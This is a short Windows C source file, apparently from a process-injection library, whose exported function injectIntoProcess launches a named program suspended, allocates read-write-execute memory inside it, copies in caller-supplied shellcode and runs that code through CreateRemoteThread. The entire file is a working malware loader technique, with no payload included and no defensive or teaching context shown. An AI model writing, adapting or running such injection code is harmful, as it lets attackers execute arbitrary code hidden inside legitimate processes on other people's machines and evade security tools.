#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include "../include/injections.h"

DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize, LPCSTR lpApplicationName)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Create a new process (e.g., notepad.exe)
    if (!CreateProcessA(lpApplicationName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return;
    }

    // Step 2: Allocate memory in the remote process
    LPVOID remoteMemory = VirtualAllocEx(pi.hProcess, NULL, dwShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteMemory == NULL) {
        printf("VirtualAllocEx failed (%d).\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    // Step 3: Write shellcode to the allocated memory
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(pi.hProcess, remoteMemory, shellcode, dwShellcodeSize, &bytesWritten)) {
        printf("WriteProcessMemory failed (%d).\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    // Step 4: Create a remote thread to execute the shellcode
    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("CreateRemoteThread failed (%d).\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    // Step 5: Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Step 6: Clean up
    VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
    TerminateProcess(pi.hProcess, 0);
    TerminateThread(pi.hThread, 0);
    //CloseHandle(hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return;
}

